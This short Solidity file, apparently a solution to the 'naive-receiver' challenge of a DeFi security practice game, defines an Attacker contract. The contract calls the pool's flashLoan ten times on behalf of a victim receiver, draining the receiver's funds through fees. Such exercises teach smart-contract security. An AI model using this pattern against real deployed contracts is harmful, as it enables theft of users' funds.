pragma solidity =0.8.25;

import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";

contract Attacker {
    function attack(NaiveReceiverPool pool, FlashLoanReceiver receiver, WETH weth) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(weth), 1, "b1bab0ba");
        }
    }
} 